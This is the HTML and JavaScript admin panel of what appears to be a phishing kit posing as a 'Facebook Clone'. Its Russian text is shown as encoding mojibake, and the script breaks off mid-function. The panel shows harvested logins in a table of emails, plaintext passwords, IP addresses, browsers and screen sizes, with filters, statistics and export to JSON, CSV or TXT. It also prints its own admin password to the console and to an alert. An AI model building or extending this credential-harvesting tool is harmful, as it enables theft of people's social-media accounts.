<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - Facebook Clone v4.0</title>
    <link rel="stylesheet" href="style.css">
    <!-- –ü–ï–†–í–´–ú –¥–µ–ª–æ–º –ø–æ–¥–∫–ª—é—á–∞–µ–º config.js -->
    <script src="config.js"></script>
    <style>
        /* –°–¢–ò–õ–ò –ê–î–ú–ò–ù–ö–ò */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Arial, sans-serif;
        }
        
        body {
            background: #f0f2f5;
            color: #1c1e21;
            padding: 20px;
        }
        
        /* –ú–û–î–ê–õ–¨–ù–û–ï –û–ö–ù–û –ü–ê–†–û–õ–Ø */
        #passwordModal {
            display: flex;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            justify-content: center;
            align-items: center;
            z-index: 10000;
        }
        
        .modal-content {
            background: white;
            padding: 30px;
            border-radius: 12px;
            width: 90%;
            max-width: 400px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }
        
        .modal-content h2 {
            color: #1877f2;
            margin-bottom: 15px;
        }
        
        .modal-input {
            width: 100%;
            padding: 12px;
            margin: 15px 0;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
        }
        
        .modal-input:focus {
            border-color: #1877f2;
            outline: none;
        }
        
        .modal-buttons {
            display: flex;
            gap: 10px;
            margin-top: 20px;
        }
        
        .modal-btn {
            flex: 1;
            padding: 12px;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .modal-btn.primary {
            background: #1877f2;
            color: white;
        }
        
        .modal-btn.success {
            background: #42b72a;
            color: white;
        }
        
        .modal-btn:hover {
            opacity: 0.9;
            transform: translateY(-2px);
        }
        
        /* –û–°–ù–û–í–ù–û–ô –ò–ù–¢–ï–†–§–ï–ô–° */
        #adminInterface {
            max-width: 1400px;
            margin: 0 auto;
            display: none;
        }
        
        /* –®–ê–ü–ö–ê */
        .admin-header {
            background: linear-gradient(135deg, #1877f2, #0d5fbf);
            color: white;
            padding: 25px;
            border-radius: 12px;
            margin-bottom: 25px;
            box-shadow: 0 4px 15px rgba(24, 119, 242, 0.2);
        }
        
        .admin-header h1 {
            display: flex;
            align-items: center;
            gap: 15px;
            margin-bottom: 10px;
        }
        
        .version-badge {
            background: rgba(255,255,255,0.2);
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: normal;
        }
        
        /* –°–¢–ê–¢–ò–°–¢–ò–ö–ê */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            background: white;
            padding: 25px;
            border-radius: 12px;
            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
            transition: transform 0.3s;
        }
        
        .stat-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 5px 15px rgba(0,0,0,0.15);
        }
        
        .stat-card h3 {
            color: #65676b;
            font-size: 14px;
            margin-bottom: 10px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .stat-card .value {
            font-size: 36px;
            font-weight: bold;
            color: #1877f2;
        }
        
        /* –§–ò–õ–¨–¢–†–´ */
        .filters-panel {
            background: white;
            padding: 25px;
            border-radius: 12px;
            margin-bottom: 25px;
            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
        }
        
        .filters-row {
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
            margin-bottom: 20px;
        }
        
        .filter-input {
            flex: 1;
            min-width: 200px;
            padding: 10px 15px;
            border: 2px solid #e4e6eb;
            border-radius: 8px;
            font-size: 14px;
        }
        
        .filter-input:focus {
            border-color: #1877f2;
            outline: none;
        }
        
        /* –ö–ù–û–ü–ö–ò –î–ï–ô–°–¢–í–ò–ô */
        .action-buttons {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        
        .action-btn {
            padding: 12px 20px;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 8px;
            transition: all 0.3s;
        }
        
        .btn-primary {
            background: #1877f2;
            color: white;
        }
        
        .btn-success {
            background: #42b72a;
            color: white;
        }
        
        .btn-danger {
            background: #ff4444;
            color: white;
        }
        
        .btn-warning {
            background: #ffbb33;
            color: white;
        }
        
        .action-btn:hover {
            opacity: 0.9;
            transform: translateY(-2px);
        }
        
        /* –¢–ê–ë–õ–ò–¶–ê */
        .table-container {
            background: white;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
            margin-bottom: 30px;
        }
        
        .data-table {
            width: 100%;
            border-collapse: collapse;
        }
        
        .data-table thead {
            background: #f0f2f5;
        }
        
        .data-table th {
            padding: 15px;
            text-align: left;
            color: #65676b;
            font-weight: 600;
            border-bottom: 2px solid #e4e6eb;
        }
        
        .data-table td {
            padding: 15px;
            border-bottom: 1px solid #e4e6eb;
        }
        
        .data-table tr:hover {
            background: #f8f9fa;
        }
        
        .email-cell {
            max-width: 200px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }
        
        .password-cell {
            font-family: monospace;
            letter-spacing: 2px;
            cursor: help;
        }
        
        .time-cell {
            white-space: nowrap;
            font-size: 13px;
            color: #65676b;
        }
        
        /* –ö–ù–û–ü–ö–ò –í –¢–ê–ë–õ–ò–¶–ï */
        .table-actions {
            display: flex;
            gap: 5px;
        }
        
        .table-btn {
            padding: 6px 12px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 12px;
            background: #f0f2f5;
        }
        
        .table-btn.view {
            background: #e7f3ff;
            color: #1877f2;
            border: 1px solid #1877f2;
        }
        
        .table-btn.delete {
            background: #ffeaea;
            color: #ff4444;
            border: 1px solid #ff4444;
        }
        
        /* –ê–ù–ê–õ–ò–¢–ò–ö–ê */
        .analytics-panel {
            background: white;
            padding: 25px;
            border-radius: 12px;
            margin-bottom: 30px;
            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
        }
        
        /* –õ–û–ê–î–ï–† */
        .loader {
            text-align: center;
            padding: 40px;
            display: none;
        }
        
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #1877f2;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        /* –§–£–¢–ï–† */
        .admin-footer {
            text-align: center;
            padding: 20px;
            color: #65676b;
            font-size: 13px;
            border-top: 1px solid #e4e6eb;
            margin-top: 30px;
        }
        
        /* –ê–î–ê–ü–¢–ò–í–ù–û–°–¢–¨ */
        @media (max-width: 768px) {
            .filters-row {
                flex-direction: column;
            }
            
            .filter-input {
                width: 100%;
            }
            
            .action-buttons {
                flex-direction: column;
            }
            
            .action-btn {
                width: 100%;
                justify-content: center;
            }
            
            .stats-grid {
                grid-template-columns: 1fr;
            }
            
            .data-table {
                font-size: 14px;
            }
            
            .data-table th,
            .data-table td {
                padding: 10px 8px;
            }
        }
        
        /* –ú–û–î–ê–õ–¨–ù–û–ï –û–ö–ù–û –≠–ö–°–ü–û–†–¢–ê */
        #exportModal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            justify-content: center;
            align-items: center;
            z-index: 10001;
        }
        
        .export-options {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
            gap: 10px;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <!-- –ú–û–î–ê–õ–¨–ù–û–ï –û–ö–ù–û –ü–ê–†–û–õ–Ø -->
    <div id="passwordModal">
        <div class="modal-content">
            <h2>üîê –ê–¥–º–∏–Ω –ü–∞–Ω–µ–ª—å Facebook Clone</h2>
            <p>–î–ª—è –¥–æ—Å—Ç—É–ø–∞ –≤–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞:</p>
            <input type="password" id="adminPassword" class="modal-input" placeholder="–ü–∞—Ä–æ–ª—å">
            <div class="modal-buttons">
                <button onclick="checkPassword()" class="modal-btn primary">–í–æ–π—Ç–∏</button>
                <button onclick="autoLogin()" class="modal-btn success">–ê–≤—Ç–æ–≤—Ö–æ–¥</button>
                <button onclick="window.open('index.html', '_blank')" class="modal-btn">–ü—Ä–µ–¥–ø—Ä–æ—Å–º–æ—Ç—Ä</button>
            </div>
            <p style="margin-top: 15px; font-size: 12px; color: #65676b;">
                –ü–∞—Ä–æ–ª—å –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é: <code></code><br>
                –î–ª—è –∞–≤—Ç–æ–≤—Ö–æ–¥–∞: Ctrl+Shift+Enter
            </p>
        </div>
    </div>
    
    <!-- –ú–û–î–ê–õ–¨–ù–û–ï –û–ö–ù–û –≠–ö–°–ü–û–†–¢–ê -->
    <div id="exportModal" class="modal">
        <div class="modal-content">
            <h2>üì§ –≠–∫—Å–ø–æ—Ä—Ç –¥–∞–Ω–Ω—ã—Ö</h2>
            <p>–í—ã–±–µ—Ä–∏—Ç–µ —Ñ–æ—Ä–º–∞—Ç –¥–ª—è —ç–∫—Å–ø–æ—Ä—Ç–∞ –¥–∞–Ω–Ω—ã—Ö:</p>
            <div class="export-options">
                <button onclick="exportData('json')" class="modal-btn primary">JSON</button>
                <button onclick="exportData('csv')" class="modal-btn success">CSV</button>
                <button onclick="exportData('txt')" class="modal-btn">TXT</button>
            </div>
            <div style="margin-top: 20px;">
                <h4>–ü—Ä–µ–¥–ø—Ä–æ—Å–º–æ—Ç—Ä –¥–∞–Ω–Ω—ã—Ö:</h4>
                <pre id="dataPreview" style="background: #f5f5f5; padding: 15px; border-radius: 8px; max-height: 200px; overflow: auto; font-size: 12px; margin-top: 10px;">
–ó–∞–≥—Ä—É–∑–∫–∞...
                </pre>
            </div>
            <div class="modal-buttons" style="margin-top: 20px;">
                <button onclick="closeExportModal()" class="modal-btn">–ó–∞–∫—Ä—ã—Ç—å</button>
            </div>
        </div>
    </div>
    
    <!-- –û–°–ù–û–í–ù–û–ô –ò–ù–¢–ï–†–§–ï–ô–° -->
    <div id="adminInterface">
        <!-- –®–ê–ü–ö–ê -->
        <div class="admin-header">
            <h1>
                üõ°Ô∏è –ü–∞–Ω–µ–ª—å —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è Facebook Clone
                <span class="version-badge">v4.0 FIXED</span>
            </h1>
            <p>–ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –∏ —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Å–æ–±—Ä–∞–Ω–Ω—ã–º–∏ –¥–∞–Ω–Ω—ã–º–∏ –≤ —Ä–µ–∞–ª—å–Ω–æ–º –≤—Ä–µ–º–µ–Ω–∏</p>
        </div>
        
        <!-- –°–¢–ê–¢–ò–°–¢–ò–ö–ê -->
        <div class="stats-grid">
            <div class="stat-card">
                <h3>üë• –í—Å–µ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π</h3>
                <div class="value" id="totalUsers">0</div>
            </div>
            <div class="stat-card">
                <h3>üìà –í—Ö–æ–¥–æ–≤ —Å–µ–≥–æ–¥–Ω—è</h3>
                <div class="value" id="todayLogins">0</div>
            </div>
            <div class="stat-card">
                <h3>üåê –£–Ω–∏–∫–∞–ª—å–Ω—ã—Ö IP</h3>
                <div class="value" id="uniqueIPs">0</div>
            </div>
            <div class="stat-card">
                <h3>‚è∞ –ü–æ—Å–ª–µ–¥–Ω–∏–π –≤—Ö–æ–¥</h3>
                <div class="value" id="lastLogin">–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö</div>
            </div>
        </div>
        
        <!-- –§–ò–õ–¨–¢–†–´ –ò –î–ï–ô–°–¢–í–ò–Ø -->
        <div class="filters-panel">
            <h3>üîç –§–∏–ª—å—Ç—Ä—ã –ø–æ–∏—Å–∫–∞</h3>
            <div class="filters-row">
                <input type="text" id="filterEmail" class="filter-input" placeholder="–§–∏–ª—å—Ç—Ä –ø–æ email" oninput="filterData()">
                <input type="text" id="filterIP" class="filter-input" placeholder="–§–∏–ª—å—Ç—Ä –ø–æ IP" oninput="filterData()">
                <input type="date" id="filterDate" class="filter-input" onchange="filterData()">
                <select id="filterLimit" class="filter-input" onchange="filterData()">
                    <option value="25">–ü–æ—Å–ª–µ–¥–Ω–∏–µ 25</option>
                    <option value="50">–ü–æ—Å–ª–µ–¥–Ω–∏–µ 50</option>
                    <option value="100">–ü–æ—Å–ª–µ–¥–Ω–∏–µ 100</option>
                    <option value="0">–í—Å–µ –∑–∞–ø–∏—Å–∏</option>
                </select>
            </div>
            
            <div class="action-buttons">
                <button onclick="refreshData()" class="action-btn btn-primary">
                    üîÑ –û–±–Ω–æ–≤–∏—Ç—å (F5)
                </button>
                <button onclick="clearAllData()" class="action-btn btn-danger">
                    üóëÔ∏è –û—á–∏—Å—Ç–∏—Ç—å –≤—Å—ë (Ctrl+D)
                </button>
                <button onclick="showExportModal()" class="action-btn btn-success">
                    üì§ –≠–∫—Å–ø–æ—Ä—Ç (Ctrl+E)
                </button>
                <button onclick="showDataPreview()" class="action-btn">
                    üëÅÔ∏è –ü—Ä–µ–¥–ø—Ä–æ—Å–º–æ—Ç—Ä (Ctrl+P)
                </button>
                <button onclick="logoutAdmin()" class="action-btn btn-warning">
                    üö™ –í—ã—Ö–æ–¥ (Ctrl+Q)
                </button>
            </div>
            
            <p id="dataCount" style="margin-top: 15px; color: #65676b; font-size: 14px;">
                –ó–∞–≥—Ä—É–∑–∫–∞ –¥–∞–Ω–Ω—ã—Ö...
            </p>
        </div>
        
        <!-- –õ–û–ê–î–ï–† -->
        <div id="loader" class="loader">
            <div class="spinner"></div>
            <p>–ó–∞–≥—Ä—É–∑–∫–∞ –¥–∞–Ω–Ω—ã—Ö...</p>
        </div>
        
        <!-- –¢–ê–ë–õ–ò–¶–ê –î–ê–ù–ù–´–• -->
        <div class="table-container">
            <table class="data-table">
                <thead>
                    <tr>
                        <th>#</th>
                        <th>Email</th>
                        <th>–ü–∞—Ä–æ–ª—å</th>
                        <th>IP</th>
                        <th>–í—Ä–µ–º—è</th>
                        <th>–ë—Ä–∞—É–∑–µ—Ä</th>
                        <th>–≠–∫—Ä–∞–Ω</th>
                        <th>–î–µ–π—Å—Ç–≤–∏—è</th>
                    </tr>
                </thead>
                <tbody id="tableBody">
                    <tr>
                        <td colspan="8" style="text-align: center; padding: 50px; color: #65676b;">
                            –ó–∞–≥—Ä—É–∑–∫–∞ –¥–∞–Ω–Ω—ã—Ö...
                        </td>
                    </tr>
                </tbody>
            </table>
        </div>
        
        
        <!-- –§–£–¢–ï–† -->
        <div class="admin-footer">
            <p>Facebook Clone Admin Panel v4.0 | –î–∞–Ω–Ω—ã–µ —Ö—Ä–∞–Ω—è—Ç—Å—è –≤ LocalStorage –±—Ä–∞—É–∑–µ—Ä–∞</p>
            <p>–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ Ctrl+Shift+A –Ω–∞ –≥–ª–∞–≤–Ω–æ–π —Å—Ç—Ä–∞–Ω–∏—Ü–µ –¥–ª—è –±—ã—Å—Ç—Ä–æ–≥–æ –¥–æ—Å—Ç—É–ø–∞ –∫ –∞–¥–º–∏–Ω–∫–µ</p>
            <p style="margin-top: 15px;">
                <button onclick="window.open('index.html', '_blank')" class="action-btn" style="padding: 8px 16px; font-size: 12px;">
                    üîÑ –ü–µ—Ä–µ–π—Ç–∏ –∫ –≥–ª–∞–≤–Ω–æ–π —Å—Ç—Ä–∞–Ω–∏—Ü–µ
                </button>
            </p>
        </div>
    </div>
    
    <!-- –ü–û–î–ö–õ–Æ–ß–ê–ï–ú –°–ö–†–ò–ü–¢–´ -->
    <script src="data.js"></script>
    
    <!-- –°–ö–†–ò–ü–¢ –ê–î–ú–ò–ù–ö–ò -->
    <script>
        console.log('üõ°Ô∏è –ó–∞–≥—Ä—É–∑–∫–∞ –∞–¥–º–∏–Ω —Å–∫—Ä–∏–ø—Ç–∞...');
        
        // –ì–õ–û–ë–ê–õ–¨–ù–´–ï –ü–ï–†–ï–ú–ï–ù–ù–´–ï
        let refreshInterval = null;
        
        // –ò–ù–ò–¶–ò–ê–õ–ò–ó–ê–¶–ò–Ø –ü–†–ò –ó–ê–ì–†–£–ó–ö–ï
        document.addEventListener('DOMContentLoaded', function() {
            console.log('‚úÖ DOM –∞–¥–º–∏–Ω–∫–∏ –∑–∞–≥—Ä—É–∂–µ–Ω');
            initializeAdmin();
        });
        
        function initializeAdmin() {
            console.log('üîß –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –∞–¥–º–∏–Ω –ø–∞–Ω–µ–ª–∏...');
            
            // –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç—ã
            if (!window.CONFIG) {
                console.error('‚ùå CONFIG –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω!');
                showError('–û—à–∏–±–∫–∞: CONFIG –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω');
                return;
            }
            
            if (!window.DataCollector) {
                console.error('‚ùå DataCollector –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω!');
                showError('–û—à–∏–±–∫–∞: DataCollector –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω');
                return;
            }
            
            console.log('‚úÖ –í—Å–µ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç—ã –∑–∞–≥—Ä—É–∂–µ–Ω—ã:', {
                CONFIG: !!CONFIG,
                DataCollector: !!DataCollector,
                version: CONFIG.VERSION
            });
            
            // –ü—Ä–æ–≤–µ—Ä—è–µ–º –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—é
            checkAuthentication();
            
            // –ù–∞—Å—Ç—Ä–∞–∏–≤–∞–µ–º –≥–æ—Ä—è—á–∏–µ –∫–ª–∞–≤–∏—à–∏
            setupHotkeys();
        }
        
        // ========== –ê–£–¢–ï–ù–¢–ò–§–ò–ö–ê–¶–ò–Ø ==========
        
        function checkAuthentication() {
            console.log('üîê –ü—Ä–æ–≤–µ—Ä–∫–∞ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏...');
            const savedPassword = localStorage.getItem('admin_auth');
            
            console.log('–°–æ—Ö—Ä–∞–Ω–µ–Ω–Ω—ã–π –ø–∞—Ä–æ–ª—å:', savedPassword ? '–¥–∞' : '–Ω–µ—Ç');
            console.log('–û–∂–∏–¥–∞–µ–º—ã–π –ø–∞—Ä–æ–ª—å:', CONFIG.ADMIN_PASSWORD);
            
            if (savedPassword === CONFIG.ADMIN_PASSWORD) {
                console.log('‚úÖ –ê—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è –ø—Ä–æ–π–¥–µ–Ω–∞');
                showAdminInterface();
            } else {
                console.log('üîí –¢—Ä–µ–±—É–µ—Ç—Å—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è');
                showPasswordModal();
            }
        }
        
        function showPasswordModal() {
            console.log('üëÅÔ∏è –ü–æ–∫–∞–∑ –º–æ–¥–∞–ª—å–Ω–æ–≥–æ –æ–∫–Ω–∞ –ø–∞—Ä–æ–ª—è');
            const modal = document.getElementById('passwordModal');
            if (modal) {
                modal.style.display = 'flex';
                
                // –§–æ–∫—É—Å –Ω–∞ –ø–æ–ª–µ –ø–∞—Ä–æ–ª—è
                setTimeout(() => {
                    const input = document.getElementById('adminPassword');
                    if (input) input.focus();
                }, 100);
            }
        }
        
        function hidePasswordModal() {
            const modal = document.getElementById('passwordModal');
            if (modal) {
                modal.style.display = 'none';
            }
        }
        
        function checkPassword() {
            console.log('üîë –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–∞—Ä–æ–ª—è...');
            const input = document.getElementById('adminPassword');
            const password = input?.value || '';
            
            console.log('–í–≤–µ–¥–µ–Ω–Ω—ã–π –ø–∞—Ä–æ–ª—å:', password);
            
            if (password === CONFIG.ADMIN_PASSWORD) {
                console.log('‚úÖ –ü–∞—Ä–æ–ª—å –≤–µ—Ä–Ω—ã–π!');
                
                // –°–æ—Ö—Ä–∞–Ω—è–µ–º –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—é
                localStorage.setItem('admin_auth', password);
                
                // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∞–¥–º–∏–Ω–∫—É
                hidePasswordModal();
                showAdminInterface();
                
            } else {
                console.log('‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å');
                alert('‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å! –ü–æ–ø—Ä–æ–±—É–π—Ç–µ: ' + CONFIG.ADMIN_PASSWORD);
                if (input) {
                    input.value = '';
                    input.focus();
                }
            }
        }
        
        function autoLogin() {
            console.log('‚ö° –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π –≤—Ö–æ–¥');
            localStorage.setItem('admin_auth', CONFIG.ADMIN_PASSWORD);
            hidePasswordModal();
            showAdminInterface();
        }
        
        function logoutAdmin() {
            console.log('üö™ –í—ã—Ö–æ–¥ –∏–∑ –∞–¥–º–∏–Ω–∫–∏');
            localStorage.removeItem('admin_auth');
            window.location.reload();
        }
        
        // ========== –û–°–ù–û–í–ù–û–ô –ò–ù–¢–ï–†–§–ï–ô–° ==========
        
        function showAdminInterface() {
            console.log('üñ•Ô∏è –ü–æ–∫–∞–∑ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞ –∞–¥–º–∏–Ω–∫–∏');
            const interface = document.getElementById('adminInterface');
            if (interface) {
                interface.style.display = 'block';
                loadAdminData();
                
                // –ê–≤—Ç–æ–æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ
                if (CONFIG.AUTO_REFRESH_DATA) {
                    startAutoRefresh();
                }
            }
        }
        
        function startAutoRefresh() {
            console.log('üîÑ –ó–∞–ø—É—Å–∫ –∞–≤—Ç–æ–æ–±–Ω–æ–≤–ª–µ–Ω–∏—è:', CONFIG.REFRESH_INTERVAL + 'ms');
            
            if (refreshInterval) {
                clearInterval(refreshInterval);
            }
            
            refreshInterval = setInterval(() => {
                console.log('üîÑ –ê–≤—Ç–æ–æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö...');
                loadAdminData();
            }, CONFIG.REFRESH_INTERVAL || 5000);
        }
        
        function stopAutoRefresh() {
            if (refreshInterval) {
                clearInterval(refreshInterval);
                refreshInterval = null;
            }
        }
        
        // ========== –ó–ê–ì–†–£–ó–ö–ê –î–ê–ù–ù–´–• ==========
        
        function loadAdminData() {
            console.log('üì• –ó–∞–≥—Ä—É–∑–∫–∞ –¥–∞–Ω–Ω—ã—Ö –¥–ª—è –∞–¥–º–∏–Ω–∫–∏...');
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ª–æ–∞–¥–µ—Ä
            const loader = document.getElementById('loader');
            if (loader) loader.style.display = 'block';
            
            try {
                // –ó–∞–≥—Ä—É–∂–∞–µ–º –¥–∞–Ω–Ω—ã–µ
                const data = DataCollector.loadFromStorage ? 
                    DataCollector.loadFromStorage() : 
                    DataCollector.data;
                
                console.log('‚úÖ –î–∞–Ω–Ω—ã–µ –∑–∞–≥—Ä—É–∂–µ–Ω—ã:', {
                    users: data?.users?.length || 0,
                    hasData: !!data
                });
                
                // –ü–æ–ª—É—á–∞–µ–º —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É
                const stats = DataCollector.getStats ? 
                    DataCollector.getStats() : 
                    { totalUsers: 0, todayLogins: 0, uniqueIPs: 0, lastLogin: '–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö' };
                
                console.log('üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞:', stats);
                
                // –û–ë–ù–û–í–õ–Ø–ï–ú –ò–ù–¢–ï–†–§–ï–ô–°
                
                // 1. –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞
                document.getElementById('totalUsers').textContent = stats.totalUsers || 0;
                document.getElementById('todayLogins').textContent = stats.todayLogins || 0;
                document.getElementById('uniqueIPs').textContent = stats.uniqueIPs || 0;
                document.getElementById('lastLogin').textContent = stats.lastLogin || '–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö';
                
                // 2. –¢–∞–±–ª–∏—Ü–∞
                updateDataTable(data?.users || []);
                
                // 3. –ê–Ω–∞–ª–∏—Ç–∏–∫–∞
                updateAnalytics(data?.users || []);
                
                // 4. –°—á–µ—Ç—á–∏–∫
                updateDataCounter(data?.users || []);
                
                // –°–∫—Ä—ã–≤–∞–µ–º –ª–æ–∞–¥–µ—Ä
                if (loader) loader.style.display = 'none';
                
                console.log('‚úÖ –ê–¥–º–∏–Ω–∫–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∞ —É—Å–ø–µ—à–Ω–æ!');
                
            } catch (error) {
                console.error('‚ùå –û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –¥–∞–Ω–Ω—ã—Ö:', error);
                
                // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –æ—à–∏–±–∫—É
                document.getElementById('totalUsers').textContent = '–û—à–∏–±–∫–∞';
                document.getElementById('todayLogins').textContent = '–û—à–∏–±–∫–∞';
                document.getElementById('uniqueIPs').textContent = '–û—à–∏–±–∫–∞';
                document.getElementById('lastLogin').textContent = '–û—à–∏–±–∫–∞';
                
                const tableBody = document.getElementById('tableBody');
                if (tableBody) {
                    tableBody.innerHTML = `
                        <tr>
                            <td colspan="8" style="text-align: center; padding: 50px; color: #ff4444;">
                                ‚ùå –û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –¥–∞–Ω–Ω—ã—Ö<br>
                                ${error.message || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞'}
                            </td>
                        </tr>
                    `;
                }
                
                if (loader) loader.style.display = 'none';
            }
        }
        
        function updateDataCounter(users) {
            const counter = document.getElementById('dataCount');
            if (!counter) return;
            
            const today = new Date().toDateString();
            const todayCount = users.filter(user => {
                try {
                    const userDate = new Date(user.timestamp).toDateString();
                    return userDate === today;
                } catch (e) {
                    return false;
                }
            }).length;
            
            counter.textContent = `${users.length} –∑–∞–ø–∏—Å–µ–π (—Å–µ–≥–æ–¥–Ω—è: ${todayCount})`;
        }
        
        // ========== –¢–ê–ë–õ–ò–¶–ê –î–ê–ù–ù–´–• ==========
        
        function updateDataTable(users) {
            console.log('üìã –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Ç–∞–±–ª–∏—Ü—ã:', users.length, '–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π');
            
            const tableBody = document.getElementById('tableBody');
            if (!tableBody) {
                console.error('‚ùå tableBody –Ω–µ –Ω–∞–π–¥–µ–Ω');
                return;
            }
            
            // –ü–æ–ª—É—á–∞–µ–º —Ñ–∏–ª—å—Ç—Ä—ã
            const filterEmail = document.getElementById('filterEmail')?.value.toLowerCase() || '';
            const filterIP = document.getElementById('filterIP')?.value.toLowerCase() || '';
            const filterDate = document.getElementById('filterDate')?.value || '';
            const filterLimit = parseInt(document.getElementById('filterLimit')?.value || '25');
            
            // –§–∏–ª—å—Ç—Ä—É–µ–º
            let filteredUsers = [...users];
            
            if (filterEmail) {
                filteredUsers = filteredUsers.filter(user => 
                    user.email && user.email.toLowerCase().includes(filterEmail)
                );
            }
            
            if (filterIP) {
                filteredUsers = filteredUsers.filter(user => 
                    user.ip && user.ip.toLowerCase().includes(filterIP)
                );
            }
            
            if (filterDate) {
                filteredUsers = filteredUsers.filter(user => {
                    try {
                        const userDate = new Date(user.timestamp).toISOString().split('T')[0];
                        return userDate === filterDate;
                    } catch (e) {
                        return false;
                    }
                });
            }
            
            // –°–æ—Ä—Ç–∏—Ä—É–µ–º –ø–æ –≤—Ä–µ–º–µ–Ω–∏ (–Ω–æ–≤—ã–µ —Å–≤–µ—Ä—Ö—É)
            filteredUsers.sort((a, b) => {
                return new Date(b.timestamp) - new Date(a.timestamp);
            });
            
            // –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º
            if (filterLimit > 0 && filteredUsers.length > filterLimit) {
                filteredUsers = filteredUsers.slice(0, filterLimit);
            }
            
            console.log('üìä –ü–æ—Å–ª–µ —Ñ–∏–ª—å—Ç—Ä–∞—Ü–∏–∏:', filteredUsers.length, '–∑–∞–ø–∏—Å–µ–π');
            
            // –û—á–∏—â–∞–µ–º —Ç–∞–±–ª–∏—Ü—É
            tableBody.innerHTML = '';
            
            // –ï—Å–ª–∏ –Ω–µ—Ç –¥–∞–Ω–Ω—ã—Ö
            if (filteredUsers.length === 0) {
                tableBody.innerHTML = `
                    <tr>
                        <td colspan="8" style="text-align: center; padding: 50px; color: #65676b;">
                            üì≠ –ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö –¥–ª—è –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è
                        </td>
                    </tr>
                `;
                return;
            }
            
            // –ó–∞–ø–æ–ª–Ω—è–µ–º —Ç–∞–±–ª–∏—Ü—É
